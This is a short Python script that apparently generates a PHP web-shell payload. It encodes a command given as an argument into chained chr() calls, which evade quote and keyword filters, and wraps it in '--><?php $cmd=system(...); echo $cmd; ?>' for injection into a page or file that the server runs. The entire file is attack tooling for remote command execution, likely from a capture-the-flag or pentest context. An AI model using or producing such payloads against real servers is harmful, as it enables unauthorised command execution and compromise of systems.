import sys

def strTochr(string):
	tmp = ""
	for i in string:
		tmp += "chr({}).".format(ord(i))
	return tmp[:-1]

if __name__ == "__main__":
	a = strTochr(sys.argv[1])
	print(a)
	shell = "--><?php $cmd=system({}); echo $cmd; ?>".format(a)
	print(shell)
